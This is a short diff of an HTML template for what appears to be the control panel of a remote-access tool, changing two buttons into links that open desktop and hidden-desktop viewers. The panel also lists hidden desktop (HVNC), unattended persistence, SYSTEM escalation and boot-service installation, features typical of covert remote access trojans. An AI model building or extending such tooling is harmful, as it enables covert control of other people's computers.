@@ -26,8 +26,8 @@
       <button id="rd-connect">mirror PC screen</button>
       <button id="rd-full">fullscreen</button>
       <button id="hvnc-start">hidden desktop (HVNC)</button>
-      <button id="rd-window">screen in new window</button>
-      <button id="hvnc-window">HVNC in new window</button>
+      <a id="rd-window" class="linkbtn" href="/viewer/{{ session_id }}?mode=desktop" target="_blank" rel="noopener">screen in new window</a>
+      <a id="hvnc-window" class="linkbtn" href="/viewer/{{ session_id }}?mode=hvnc" target="_blank" rel="noopener">HVNC in new window</a>
       <button id="persist">install unattended persistence</button>
       <button id="getsystem">GetSystem (escalate to SYSTEM)</button>
       <button id="service">install boot service (SYSTEM)</button>
